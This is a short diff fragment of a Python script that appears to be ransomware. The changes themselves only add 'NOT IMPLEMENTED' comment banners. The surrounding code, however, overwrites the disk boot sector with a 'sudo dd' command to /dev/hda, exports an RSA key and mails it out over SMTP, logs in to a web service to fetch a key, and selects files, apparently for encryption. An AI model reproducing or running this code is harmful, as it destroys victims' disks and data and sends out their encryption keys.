@@ -38,7 +38,7 @@ elif sys.platform == 'linux2':
 		os.system("sudo dd if=boot.bin of=/dev/hda bs=512 count=1 && exit")
 	except:
 		pass
-
+######################################---NOT IMPLEMENTED---######################################
 def Key_Ops_HTTP():
 	br = mechanize.Browser()
 	br.set_handle_robots(False)
@@ -59,7 +59,7 @@ def Key_Ops_HTTP():
 	br.submit()
 	# If log in was succesful retrieve key and post ID
 	###---@---###
-	
+######################################---NOT IMPLEMENTED---######################################	
 
 def send_Key_SMTP():
 	ts = datetime.datetime.now()
@@ -177,7 +177,7 @@ if __name__=="__main__":
 		exKey = key.exportKey('PEM')
 		send_Key_SMTP()
 	else:
-		Key_Ops_HTTP()
+		Key_Ops_HTTP() # Not implemented
 		
 	select_files()
 		
